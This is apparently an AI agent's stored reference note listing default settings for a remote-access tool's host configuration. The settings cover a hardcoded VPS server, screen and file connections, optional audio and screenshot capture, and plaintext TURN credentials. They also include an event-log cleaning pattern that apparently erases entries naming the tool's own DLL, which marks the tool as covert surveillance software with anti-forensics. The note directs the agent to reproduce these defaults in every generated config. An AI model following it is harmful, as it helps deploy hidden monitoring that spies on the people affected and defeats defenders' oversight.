---
name: reference-host-config
description: Canonical host_config.json defaults (as of 2026-04-08) — use as source of truth for template generation
metadata:
  type: reference
---

Stored in `host_config.json.template`. Use as source of truth for defaults, field names, and ordering.

**Key fields & values:**
- `server`: `64.226.66.66` (VPS IP, port 8080)
- `codec`: h264, `quality`: 80, `fps`: 30, `scale`: 100, `bitrate`: 2000
- `screen_connections`: 1, `file_connections`: 4
- `stun_server`: `stun:64.226.66.66:3478`
- `turn_server`: `turn:rdp:secret-password@64.226.66.66:3478`
- `evtlog_clean_patterns`: `pnpext,pnpext.dll`
- Screenshot: disabled, 10s interval, q75, scale 50, always=true
- Audio: disabled, 30s segment, 16kHz, 128kbps, mono, gain 100
- `threat_scan_enabled`: true, `threat_auto_pause`: false

**How to apply:** When generating new configs, editing the template, or validating runtime config, match this shape. Preserve field ordering as in the template.
